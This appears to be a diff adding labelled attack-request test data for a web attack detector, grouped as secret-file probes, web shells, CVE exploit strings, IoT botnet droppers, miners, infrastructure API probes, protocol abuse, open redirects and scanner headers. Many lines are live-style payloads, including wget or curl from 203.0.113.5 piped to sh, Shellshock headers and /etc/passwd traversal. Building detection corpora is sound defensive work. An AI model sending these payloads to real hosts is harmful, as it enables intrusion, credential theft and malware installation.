+secrets	/.env.bak
+secrets	/.env.save
+secrets	/.env.old
+secrets	/.env-example
+secrets	/.env-sample
+secrets	/api/.env
+secrets	/backend/.env
+secrets	/laravel/.env
+secrets	/admin/.env
+secrets	/config.env
+secrets	/sendgrid.env
+secrets	/.aws/credentials
+secrets	/.aws/config
+secrets	/.git/config
+secrets	/.git/HEAD
+secrets	/.git/index
+secrets	/.git-credentials
+secrets	/.gitmodules
+secrets	/.svn/entries
+secrets	/.svn/wc.db
+secrets	/.hg/hgrc
+secrets	/.DS_Store
+secrets	/config/database.yml
+secrets	/config/secrets.yml
+secrets	/config/master.key
+secrets	/app/etc/env.php
+secrets	/wp-config.php.bak
+secrets	/wp-config.php~
+secrets	/wp-config.php.save
+secrets	/wp-config.old
+secrets	/.npmrc
+secrets	/.docker/config.json
+secrets	/.kube/config
+secrets	/server.key
+secrets	/privatekey.pem
+secrets	/private.key
+secrets	/id_rsa
+secrets	/.ssh/id_rsa
+secrets	/.ssh/authorized_keys
+secrets	/backup.zip
+secrets	/db.sql
+secrets	/dump.sql
+secrets	/database.sql.gz
+secrets	/site.tar.gz
+secrets	/.htpasswd
+secrets	/phpinfo.php
+secrets	/info.php
+secrets	/phpinfo
+secrets	/phpinfo.php~
+secrets	/phpinfo.php.save
+secrets	/_environment
+secrets	/webroot/index.php/_environment
+secrets	/.idea/workspace.xml
+secrets	/storage/logs/laravel.log
+secrets	/debug/default/view
+secrets	/_profiler/phpinfo
+secrets	/actuator/env
+secrets	/actuator/heapdump
+secrets	/actuator;/env
+~secrets	/env
+secrets	/heapdump
+secrets	/.travis.yml
+secrets	/.gitlab-ci.yml
+secrets	/.github/workflows/deploy.yml
+secrets	/.circleci/config.yml
+secrets	/terraform.tfstate
+secrets	/.terraform/terraform.tfstate
+secrets	/.bash_history
+secrets	/.boto
+secrets	/.s3cfg
+secrets	/.claude/settings.json
+secrets	/.claude/settings.local.json
+secrets	/.cursor/mcp.json
+secrets	/.mcp.json
+secrets	/claude_desktop_config.json
+secrets	/.amplifyrc
+secrets	/credentials.json
+~secrets	/credentials
+secrets	/token.json
+secrets	/sftp-config.json
+secrets	/.vscode/sftp.json
+secrets	/.ftpconfig
+secrets	/.remote-sync.json
+secrets	/secrets.json
+secrets	/serviceAccountKey.json
+secrets	/firebase-adminsdk.json
+secrets	/google-credentials.json
+secrets	/gcp-sa.json
+secrets	/application_default_credentials.json
+secrets	/.config/gcloud/application_default_credentials.json
+secrets	/keyfile.json
+secrets	/.pgpass
+secrets	/.my.cnf
+secrets	/wp-content/debug.log
+secrets	/error_log
+secrets	/npm-debug.log
+secrets	/@vite/env
+secrets	/server-status
+secrets	/web.config
+secrets	/appsettings.json
+secrets	/appsettings.Production.json
+secrets	/docker-compose.yml
+secrets	/docker-compose.prod.yaml
+~secrets	/.dockerenv
+~secrets	/nbproject/project.properties
+secrets	/sentry.properties
+secrets	/config/aws.yml
+~secrets	/env.js
+~secrets	/env.txt
+~secrets	/vendor/composer/installed.json
+secrets	/.aider.conf.yml
+secrets	/.continue/config.json
+secrets	/.codeium/config.json
+secrets	/.openai.env
+secrets	/.netrc
+secrets	/.npmrc.bak
+secrets	/config.php.bak
+secrets	/configuration.php.bak
+secrets	/database.yml
+secrets	/.env.development.local
+secrets	/.env.staging
+secrets	/.env.dev
+secrets	/.env.prod
+secrets	/.env.test
+secrets	/.env.www
+secrets	/.env.backup
+secrets	/.env.dist
+secrets	/.env.example
+~secrets	/env.json
+secrets	/.envrc
+secrets	/.flaskenv
+secrets	/.secrets
+secrets	/secrets.yml
+secrets	/aws.json
+secrets	/aws-credentials
+secrets	/.aws/credentials.bak
+secrets	/.bitcoin/wallet.dat
+secrets	/wallet.dat
+secrets	/.ethereum/keystore
+secrets	/.wp-config.php.swp
+secrets	/.config.php.swp
+secrets	/index.php.bak
+secrets	/.user.ini
+~secrets	/.php_cs.cache
+secrets	/.ssh/known_hosts
+secrets	/.zsh_history
+secrets	/.history
+secrets	/.viminfo
+secrets	/WEB-INF/web.xml
+secrets	/META-INF/MANIFEST.MF
+secrets	/phpmyadmin/config.inc.php
+secrets	/logs/error.log
+secrets	/log/development.log
+~secrets	/admin/config.php
+secrets	/includes/config.php.bak
+~secrets	/config.json
+~secrets	/settings.json
+~secrets	/config.js
+~secrets	/app.config.js
+~secrets	/composer.json
+~secrets	/composer.lock
+~secrets	/Dockerfile
+~secrets	/aws-exports.js
+~secrets	/runtime-config.js
+~secrets	/env-config.js
+~secrets	/package.json
+~secrets	/.gitignore
+~secrets	/info
+~secrets	/key.json
+~secrets	/sa.json
+~secrets	/auth.json
+~secrets	/swagger.json
+~secrets	/api-docs
+~secrets	/v2/api-docs
+~secrets	/swagger-ui.html
+~secrets	/graphql?query={__schema{types{name}}}
+# ------------------------------------------------------------------ web shells
+webshell	/alfa.php
+webshell	/wso.php
+webshell	/c99.php
+webshell	/r57.php
+webshell	/ALFA_DATA/alfacgiapi/perl.alfa
+webshell	/.well-known/shell.php
+webshell	/wp-content/plugins/hellopress/wp_filemanager.php
+webshell	/x.php?cmd=id
+webshell	/shell.jsp?cmd=whoami
+webshell	/cmd.aspx?cmd=whoami
+webshell	/xmrlpc.php
+~webshell	/wp-includes/ID3/index.php
+webshell	/wp-admin/css/colors/blue/index.php
+webshell	/wp-content/uploads/2024/01/x.php
+webshell	/tinyfilemanager.php
+webshell	/filemanager.php
+webshell	/gecko.php
+webshell	/wp-blog.php
+webshell	/radio.php
+webshell	/wp-content/themes/twentytwenty/404.php?cmd=id
+webshell	/upload.php?cmd=ls
+webshell	/admin.php?act=cmd&cmd=id
+webshell	/system_log.php
+webshell	/ups.php
+~webshell	/0x.php
+webshell	/mini.php
+~webshell	/bypass.php
+webshell	/wp-content/plugins/wp-file-manager/lib/files/x.php
+webshell	/.tmb/x.php
+webshell	/cgi-bin/x.php?c=id
+webshell	/simple.php
+webshell	/xl2023.php
+webshell	/about.php?cmd=id
+webshell	/inputs.php
+webshell	/chosen.php
+webshell	/wp-admin/maint/x.php
+~webshell	/shell.php
+~webshell	/cmd.php
+~webshell	/up.php
+~webshell	/wp-includes/js/crop/x.php
+# ------------------------------------------------------------------ known exploits (CVE)
+cve	/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+cve	/index.php?s=/index/\think\app/invokefunction
+cve	/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x
+cve	/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
+cve	/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+cve	/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+cve	/vpn/../vpns/cfg/smb.conf
+cve	/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
+cve	/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+cve	/autodiscover/autodiscover.json?@evil.example/owa/&Email=autodiscover/autodiscover.json%3F@evil.example
+cve	/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+cve	/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+cve	/_ignition/execute-solution
+cve	/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+cve	/index.php?routestring=ajax/render/widget_php&widgetConfig[code]=echo%20shell_exec('id');exit;
+cve	/ui/vropspluginui/rest/services/uploadova
+cve	/api/v1/totp/user-backup-code/../../license/keys-status/;id
+cve	/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y
+cve	/app/rest/users/id:1/tokens/RPC2
+cve	/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'id')
+cve	/solr/admin/cores?wt=velocity
+cve	/console/css/%252e%252e%252fconsole.portal
+cve	/invoker/JMXInvokerServlet
+cve	/api/jsonws/invoke
+cve	/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+cve	/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+cve	/api/index.php/v1/config/application?public=true
+cve	/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+cve	/public/plugins/alertlist/../../../../../../../../etc/passwd
+cve	/s/x/_/;/WEB-INF/web.xml
+cve	/moveitisapi/moveitisapi.dll?action=m2
+cve	/webui/logoutconfirm.html?logon_hash=1
+cve	/index.php?action=conditions/render
+cve	/actuator/gateway/routes
+cve	/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1
+~cve	/ssl-vpn/hipreport.esp
+~cve	/api/v1/validate/code
+cve	/cgi-bin/status	H:User-Agent=() { :; }; echo; /bin/bash -c 'cat /etc/passwd'
+cve	/hax?jsp=/app/rest/server;.jsp
+cve	/app/rest/users;.jsp
+cve	/res/../admin/diagnostic.jsp
+cve	/.well-known/acme-challenge/../../admin/diagnostic.jsp
+cve	/SetupWizard.aspx/x
+cve	/gwtest/formssso?event=start&target=x
+cve	/template/aui/text-inline.vm
+cve	/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
+cve	/pages/doenterpagevariables.action?queryString=\u0027%2b#{\u0022\u0022[\u0022class\u0022]}%2b\u0027
+cve	/app?service=page/SetupCompleted
+cve	/clients/MyCRL	M=POST
+cve	/@fs/etc/passwd?import&raw??
+cve	/@fs/etc/passwd?raw??
+cve	/@fs/root/.ssh/id_rsa?import&?inline=1.wasm?init
+cve	/cli?remoting=false	M=POST
+cve	/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=x
+cve	/WebInterface/function/?command=zip&c2f=x&path={working_dir}&names=/x
+cve	/saas./resttosaasservlet
+cve	/SamlResponseServlet	M=POST
+cve	/?n=%0A&cmd=ipconfig+/all&search=%25xxx%25url%25:%password%25}{.exec|{.?cmd.}|timeout=15|out=abc.}
+cve	/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
+cve	/developmentserver/metadatauploader	M=POST
+cve	/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx	M=POST
+cve	/p/u/doAuthentication.do	M=POST
+cve	/Synchronization	M=POST
+cve	/php/ztp_gate.php/.js.map
+cve	/php/utils/createRemoteAppwebSession.php/watchTowr.js.map
+cve	/api/fabric/device/status	H:Authorization=Bearer AAAAAA'or'1'='1
+cve	/remote_agent.php?action=polldata&poller_id=;id&host_id=1&local_data_ids[]=1
+cve	/userportal/Controller?mode=8700&operation=1&datagrid=179&json={"x":"test"}
+cve	/AHT/AhtApiService.asmx/AuthUser	M=POST
+cve	/dataBases/upgrademysqlstatus	M=POST
+cve	/goanywhere/lic/accept	M=POST
+cve	/goanywhere/wizard/InitialAccountSetup.xhtml
+cve	/..;/wizard/InitialAccountSetup.xhtml
+cve	/dana-ws/saml20.ws	M=POST
+cve	/rest/api/latest/projects/X/repos/y/archive?filename=x&at=x&path=x&prefix=ax%00--exec=%60id%60%00--remote=origin
+cve	/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+cve	/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1
+cve	/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE
+cve	/json/setup-restore.action
+cve	/./RestAPI/LicenseMgr
+cve	/vendor/htmlawed/htmlawed/htmLawedTest.php
+cve	/wp-content/plugins/wp-automatic/inc/csv.php
+cve	/wp-json/bricks/v1/render_element	M=POST
+cve	/wp-content/plugins/backup-backup/includes/backup-heart.php
+cve	/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+cve	/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
+cve	/?swp_debug=load_options&swp_url=http://evil.example/x.txt
+cve	/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=
+cve	/minio/bootstrap/v1/verify	M=POST
+cve	/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true
+cve	/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc
+cve	/functionRouter	M=POST	H:spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec("id")
+cve	/	H:x-middleware-subrequest=middleware:middleware:middleware:middleware:middleware
+cve	/admin	H:x-middleware-subrequest=src/middleware
+cve	/	H:Content-Type=%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}
+cve	/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(1)</script>
+cve	/npm-pwg/..;/axis2-AWC/services/listServices
+cve	/client/index.php%3F.php/gsb/users.php
+cve	/apps/zxtm/login.cgi	M=POST
+cve	/nacos/v1/auth/users?pageNo=1&pageSize=9	H:User-Agent=Nacos-Server
+cve	/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=x
+cve	/mgmt/tm/util/bash	M=POST
+cve	/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("id")}
+cve	/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=form&method=GetImage&imgfile=../../../../etc/passwd
+cve	/jars/upload	M=POST
+cve	/api/setup/validate	M=POST
+cve	/druid/indexer/v1/sampler	M=POST
+cve	/xmlpserver/ReportTemplateService.xls
+cve	/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/
+cve	/weaver/bsh.servlet.BshServlet
+cve	/seeyon/htmlofficeservlet
+cve	/sslmgr?scep-profile-name=%9999999c
+cve	/boaform/admin/formLogin?username=admin&psd=admin
+cve	/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=x
+# ------------------------------------------------------------------ IoT & botnet droppers
+iot	/shell?cd+/tmp;rm+-rf+*;wget+http://203.0.113.5/jaws;sh+/tmp/jaws
+iot	/GponForm/diag_Form?images/
+iot	/picsdesc.xml
+iot	/ctrlt/DeviceUpgrade_1
+iot	/SDK/webLanguage	M=PUT
+iot	/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)
+iot	/device.rsp?opt=user&cmd=list
+iot	/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://203.0.113.5:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+iot	/boaform/admin/formPing?target_addr=;wget%20http://203.0.113.5/x.mips;chmod%20777%20x.mips;./x.mips
+iot	/tmUnblock.cgi
+iot	/goform/setUsbUnload/.js?deviceName=A;wget%20http://203.0.113.5/x
+iot	/cgi-bin/ViewLog.asp
+iot	/HNAP1/	H:SOAPAction=http://purenetworks.com/HNAP1/`cd /tmp && wget http://203.0.113.5/x`
+iot	/cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}%27cd${IFS}/tmp;${IFS}wget${IFS}http://203.0.113.5/x%27%0A%27
+iot	/apply.cgi?submit_button=x&action=x
+iot	/language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://203.0.113.5/x;sh${IFS}/tmp/x&>r&&tar${IFS}/string.js
+iot	/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;wget%20http://203.0.113.5/x;%22
+iot	/setup.cgi?todo=syscmd&cmd=id
+iot	/?x=cd /tmp; wget http://203.0.113.5/bins.sh; chmod 777 bins.sh; sh bins.sh
+iot	/?x=tftp -g -r x.arm7 203.0.113.5
+iot	/cgi-bin/;wget http://203.0.113.5/x.arm
+iot	/hndUnblock.cgi
+iot	/cgi-bin/supervisor/CloudSetup.cgi?exefile=id
+~iot	/onvif/device_service	M=POST
+iot	/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id
+iot	/web_shell_cmd.gch
+~iot	/command.php	M=POST
+iot	/cgi-bin/jarrewrite.sh
+~iot	/HNAP1/GetDeviceSettings
+iot	/config/getuser?index=0
+iot	/cgi-bin/webproc?getpage=../../../etc/passwd&var:language=en_us
+~iot	/stssys.htm
+iot	/cgi-bin/DownloadFlash?file=../../etc/passwd
+iot	/login.cgi?cli=aa%20aa%27;wget%20http://203.0.113.5/x%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$
+iot	/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;wget%20http://203.0.113.5/x)
+iot	/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27
+~iot	/cgi-bin/p1_ftpserver.cgi?
+iot	/wanipcn.xml
+iot	/goform/formSysCmd	M=POST
+iot	/cgi-bin/luci/;stok=/locale
+iot	/?x=busybox wget http://203.0.113.5/a; chmod +x a; ./a
+# ------------------------------------------------------------------ miners
+miner	/?x=;curl -s http://203.0.113.5/kinsing|sh
+miner	/?x=stratum+tcp://pool.example:3333
+miner	/?x=;wget http://203.0.113.5/xmrig
+miner	/ldr.sh
+# ------------------------------------------------------------------ infrastructure APIs
+infra	/containers/json
+infra	/v1.24/containers/create	M=POST
+infra	/api/v1/namespaces/default/secrets
+infra	/api/v1/pods
+infra	/v2/_catalog
+infra	/_cat/indices
+infra	/_all/_search?q=*
+infra	/debug/pprof/
+infra	/latest/meta-data/iam/security-credentials/
+infra	/computeMetadata/v1/instance/
+infra	/runningpods/
+infra	/run/default/pod/container
+infra	/v1/agent/self
+infra	/v1/kv/?recurse
+~infra	/metrics
+~infra	/version	H:User-Agent=python-requests/2.31
+infra	/v2/keys/?recursive=true
+infra	/ws/v1/cluster/apps/new-application	M=POST
+infra	/jolokia/list
+infra	/manager/text/list
+infra	/_cluster/health
+infra	/_nodes
+infra	/actuator/heapdump
+~infra	/hystrix.stream
+# ------------------------------------------------------------------ protocol abuse
+~protocol	/	M=TRACE
+~protocol	/	M=TRACK
+~protocol	/	M=DEBUG
+~protocol	http://evil.example/
+~protocol	/	M=CONNECT
+protocol	/%0d%0aSet-Cookie:x=1
+protocol	/x?y=%0d%0aLocation:%20http://evil.example
+~protocol	/%0aX-Injected:1
+protocol	/x?q=%E5%98%8A%E5%98%8DSet-Cookie:x=1
+~protocol	/	H:Transfer-Encoding=chunked	H:Content-Length=4	M=POST
+~protocol	/	H:Transfer-Encoding=xchunked	M=POST
+~protocol	/	H:Transfer-Encoding= chunked	H:Content-Length=10	M=POST
+~protocol	/	H:Content-Length=10, 11	M=POST
+~protocol	/admin	H:X-Original-URL=/admin
+~protocol	/	H:X-Rewrite-URL=/admin
+~protocol	/a%00.php
+~protocol	/x?y=%c0%ae%c0%ae
+# open redirects
+~redirect	/redirect?url=//evil.example
+~redirect	/login?next=//evil.example/
+~redirect	/go?return=/\evil.example
+~redirect	/r?redirect=%2F%2Fevil.example
+~redirect	/r?continue=https:evil.example
+~redirect	/r?url=////evil.example
+~redirect	/r?url=https://legit.example@evil.example
+~redirect	/r?url=%5C%5Cevil.example
+~redirect	/r?next=/%09/evil.example
+~redirect	/r?url=/%2F%2Fevil.example
+# ------------------------------------------------------------------ attack tools and header attacks
+recon	/	H:User-Agent=sqlmap/1.7.2#stable (https://sqlmap.org)
+recon	/	H:User-Agent=Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)
+recon	/	H:User-Agent=Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
+recon	/	H:User-Agent=Fuzz Faster U Fool v2.1.0
+recon	/	H:User-Agent=Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+recon	/	H:User-Agent=WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)
+recon	/	H:User-Agent=gobuster/3.6
+recon	/	H:User-Agent=Hydra
+recon	/	H:User-Agent=Mozilla/5.0 (compatible; Acunetix/13)
+recon	/	H:User-Agent=() { :; }; /bin/bash -c "wget http://203.0.113.5/x"
+recon|xss	/	H:User-Agent=<script>alert(1)</script>
+recon|sqli	/	H:User-Agent=' OR 1=1--
+recon|sqli	/	H:X-Forwarded-For=1' AND SLEEP(5)--
+recon|sqli	/	H:Referer=http://x/' union select 1,2--
+recon|rce	/	H:User-Agent=<?php system('id'); ?>
+recon|rce	/	H:Cookie=x=;wget http://203.0.113.5/x|sh
+recon|rce	/	H:X-Forwarded-For=127.0.0.1;id
+recon|ssti	/	H:User-Agent={{7*7}}
